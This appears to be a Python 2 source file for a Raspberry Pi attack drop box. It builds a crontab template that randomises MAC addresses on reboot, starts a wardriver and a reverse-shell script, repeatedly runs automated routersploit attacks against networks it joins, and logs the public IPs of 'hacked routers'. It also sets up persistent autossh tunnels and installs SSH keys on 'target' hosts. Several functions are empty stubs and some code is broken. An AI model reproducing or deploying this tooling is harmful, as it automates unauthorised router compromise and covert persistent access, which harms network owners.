import time, socket, os, subprocess, threading, sys, operator, io, toolkits, StringIO
from termcolor import colored

# need to split this app into two

# new bug, the ssh program will not allow you to respond because sys.stdout is overwritten
# solution is to use pexpect because we know something is being printed
# default variable values

# key generator works now

# new LULLC mandated naming syntax
# d_ = dictionary data type
# v_ = variable (integer, string, or float, etc.)
# f_ = function
# c_ = class
d_variables = {}
v_userLoginSelection = ''
v_cronScriptTemplate = ''
# directory paths
v_binPath = '/usr/local/bin/' # all executables
v_piPath = '/home/pi/' # default pi user path
v_logPath = '/var/log/auto_rsf/' # default log path
v_etcPath = '/etc/' # configuration files

# for the rpi
v_rpiStartupScript = v_binPath + 'startup.sh' # /usr/local/bin/startup.sh
v_wardriverXpressBinary = v_binPath + 'wardriverXpress.py'
v_wardriverXpressLog = v_logPath + 'wardriverXpress.log' # /var/log/auto_rsf/wardriverXpress.log
v_reverseShellsScript = v_binPath + 'reverseShells.sh'
v_AutoRSFStartupScript = v_binPath + 'AutoRSF.py'
v_wpaSupplicantConf = v_etcPath + 'wpa_supplicant/wpa_supplicant.conf' # /etc/wpa_supplicant/wpa_supplicant.conf

# for the autotunneler
v_hostProfile = '' # the name of profile in /root/.ssh/config
v_hostProfileIPv4 = ''
v_userLogin = 'root'
v_remotePort = '22'
v_IdentityFile = ''
v_LocalForward = '22'
v_localhostPort = '22'


# parses together the complete files for...
# v_homeDotSSHConfig = d_variables['dot-ssh-config'] # /root/.ssh/config

# v_AutoRSFTemplate = d_variables['auto-rsf'] # /usr/local/bin/AutoRSF.py
# v_cronScriptTemplate = d_variables['cron-script'] # crontab -l
hostsFile = '/usr/local/bin/autoTunnelerHostsFile.txt'
cmd = ''
d_commands = {
    'autossh': "autossh -M -0 -f -T -N",
}
# variables with uniqueness, very large
d_variables = {
    'cron-script': """
    # declare path, including default /home/pi
    PATH={0}

    # change mac address on reboot
    @reboot ifconfig wlan0 down;macchanger -r -b wlan0;ifconfig wlan0 up
    @reboot ifconfig wlan1 down;macchanger -r -b wlan1;ifconfig wlan1 up
    @reboot ifconfig wlan2 down;macchanger -r -b wlan2;ifconfig wlan2 up
    @reboot ifconfig wlan0 up
    @reboot ifconfig wlan1 up
    @reboot ifconfig wlan2 up
    @reboot ifconfig eth0 up

    # escalate to root on reboot
    @reboot /bin/bash {1}
    @reboot sudo su
    @reboot service ssh restart

    # start wardriver express on wlan1
    @reboot python {2} >> {3}

    # start reverse shells
    @reboot /bin/sh {4}

    # start auto routersploit on wlan2
    * * * * * sleep 5;/bin/sh {5}

    # every minute rescan and retry looking for cracked networks
    * * * * * wpa_supplicant -i wlan2 -c {6}
    @reboot sleep 30;wpa_supplicant -i wlan2 -c {6}
    """.format(str(v_piPath),str(v_rpiStartupScript),str(v_wardriverXpressBinary),str(v_wardriverXpressLog),str(v_reverseShellsScript),str(v_AutoRSFStartupScript),str(v_wpaSupplicantConf)),
    'dot-ssh-config': """


    Host {}
        HostName {}
        User    {}
        Port    {}
        IdentityFile {}
        LocalForward {} localhost:{}
        ServerAliveInterval 30
        ServerAliveCountMax 3
    """.format(str(v_hostProfile),str(v_hostProfileIPv4),str(v_userLogin),str(v_remotePort),str(v_IdentityFile),str(v_LocalForward),str(v_localhostPort)),
    'auto-rsf': """
    !/bin/sh

    getipaddr="dig +short myip.opendns.com @resolver1.opendns.com"

    fileip="/home/pi/ip_addr_hacked_routers.log"
    TIMEFORMAT=%R
    timestr=$( date )

    eval $getipaddr >> $fileip

    if sudo cat /sys/class/net/wlan1/operstate | grep -xqFe up
    then
    	eval $getipaddr >> $fileip
    	echo "Connected to Target. Autohacking"
    	python /usr/local/bin/pexpect_rsf_concept_routingfix.py >> /var/log/auto_rsf/AutoRSF"$timestr".log
    else
    	echo "No networks detected"
    fi

    if sudo cat /sys/class/net/wlan2/operstate | grep -xqFe up
    then
    	eval $getipaddr >> $fileip
    	echo "Connected to Target."
    	python /usr/local/bin/pexpect_rsf_concept_routingfix.py >> /var/log/auto_rsf/AutoRSF"$timestr".log
    else
    	echo "No networks detected"
    fi

    if sudo cat /sys/class/net/wlan0/operstate | grep -xqFe up
    then
    	eval $getipaddr >> $fileip
    	echo "Connected to Target."
    	python /usr/local/bin/pexpect_rsf_concept_routingfix_wlan0.py >> /var/log/auto_rsf/AutoRSF.log
    else
    	echo "No networks detected"
    fi
    """.format(str(v_logPath)),
}
d_commands = {
    'upload-ssh-key': 'ssh-copy-id',
    'generate-ssh-key': 'ssh-keygen',
    'scan-ssh-key': 'ssh-keyscan',
    'autossh': "autossh -M -0 -f -T -N",
}
# allows display of colored text
def yellow(string):
    string = toolkits.yellow(string)
    print string
    return string
def red(string):
    string = toolkits.red(string)
    print string
    return string
def green(string):
    string = toolkits.green(string)

    print string
    return string
def magenta(string):
    string = toolkits.magenta(string)
    print string
    return string
def cyan(string):
    string = toolkits.cyan(string)

    print string
    return string

# throws a error message instead of a name or index error.
def exception_wrongInput():
    os.system('clear')
    print "You have entered a invalid option"
    main()
    return
def f_autoSSHCommands(d_variables, d_commands, v_userLoginSelection, v_cronScriptTemplate):
    cmd_uploadSSHKey = d_commands['upload-ssh-key']
    cmd_generateSSHKey = d_commands['generate-ssh-key']
    cmd_scanSSHKey = d_commands['scan-ssh-key']
    cmd_autoSSH = d_commands['autossh']
    v_homeDotSSHConfig = d_variables['dot-ssh-config'] # /root/.ssh/config

    v_AutoRSFTemplate = d_variables['auto-rsf'] # /usr/local/bin/AutoRSF.py
    v_cronScriptTemplate = d_variables['cron-script'] # crontab -l
    print """
    0: Return to Main Menu
    1: Upload your SSH Key to a Remote Server
    2: Generate a new SSH Key
    3: Scan and save a SSH Key from a Remote Server
    4: Create a temporary SSH Tunnel
    5: Generate a autostart script (permanently making a SSH Tunnel on reboot)
    6: Edit the SSH Tunnel Hosts Profile List (Permanent)
    """

    v_optChoice = int(raw_input("Enter a OPTION: "))

    if v_optChoice == 0:
        main()
    elif v_optChoice == 1:
    # cc = completed command
        
        cc_uploadSSHKey = "{0} -p {1} {2}".format(
            str(cmd_uploadSSHKey),
            str(v_remotePort),
            str(v_hostProfileIPv4)
        )
        yellow(cc_uploadSSHKey)
        f_bashCommand(cc_uploadSSHKey)
    elif v_optChoice == 2:
        cc_generateSSHKey = "{0}".format(
            str(cmd_generateSSHKey)
            )
        yellow(cc_generateSSHKey)
        f_bashCommand(cc_generateSSHKey)
    elif v_optChoice == 3:
        cc_scanSSHKey = "{} -p {} {}".format(
            str(cmd_scanSSHKey),
            str(v_remotePort),
            str(v_hostProfile)
        )
        yellow(cc_scanSSHKey)
        f_bashCommand(cc_scanSSHKey)
    elif v_optChoice == 4:
        cc_autoSSH = "{} -p {} {}".format(
            str(cmd_autoSSH),
            str(v_remotePort),
            str(v_hostProfile)
        )
        yellow(cc_autoSSH)
        f_bashCommand(cc_autoSSH)
    elif v_optChoice == 5:
        f_autoSSHCommands(d_variables, d_commands, v_userLoginSelection, v_cronScriptTemplate)
    elif v_optChoice == 6:
        cmd = "nano %s" % str(hostsFile)
    else:
        exception_wrongInput()
    return


def f_generateCronScript(v_cronScriptTemplate, v_homeDotSSHConfig, v_AutoRSFTemplate):


    return

def f_generateHomeDotSSHConfig(v_homeDotSSHConfig, v_remotePort, v_hostProfileIPv4, hostsFile):
    # read lines on hosts file and for each line...
    r = open(hostsFile,'a+')
    with open(hostsFile,'a+') as r:
        line = r.readline()
        sentence = str(line.strip()) # for the for-loop iterator below
        l_values = line.split(' ') # parse the line into a list of strings
        v_hostProfileIPv4 = str(l_values[0])
        v_userLogin = str(l_values[1])
        v_remotePort = str(l_values[2])
        v_IdentityFile = str(l_values[3])
        v_LocalForward = str(l_values[4])
        v_localhostPort = str(l_values[5])

        for sentence in r:
            yellow("""
            ### TARGET ###
            HOST: %s
            USERNAME: %s
            REMOTE PORT: %s
            KEY FILE: %s


            ### YOU ###
            SSH SERVICE PORT: %s
            LOCAL ROUTER EXTERNAL PORT: %s
            """ % str(v_hostProfileIPv4),str(v_userLogin),str(v_remotePort),str(v_IdentityFile),str(v_LocalForward),str(v_localhostPort))

            if sentence != "":
                try:
                    # install keys remotely

                    cmd = "ssh-copy-id -p {port} -f {host}"
                    f_bashCommand(cmd)

                    # write a new entry onto /root/.ssh/config

                    w = open(hostsFile, 'a+')
                    w.write(v_homeDotSSHConfig)
                    w.close()
                except:
                    os.system('clear')
                    green("Complete, please edit your crontab file with crontab -e and add the new crontab config before rebooting")

                    exit(0)
    return

def f_generateAutoRSFTemplate(v_AutoRSFTemplate):
    return
# cronScript = d_variables['croncript']

def f_bashCommand(cmd):
    output = subprocess.call(cmd, shell=True, executable='/bin/bash')
    return output

def f_obfs4Loader():
    return

def f_installer():
    return

def main():
    f_autoSSHCommands(d_variables, d_commands, v_userLoginSelection, v_cronScriptTemplate)
    return
main()
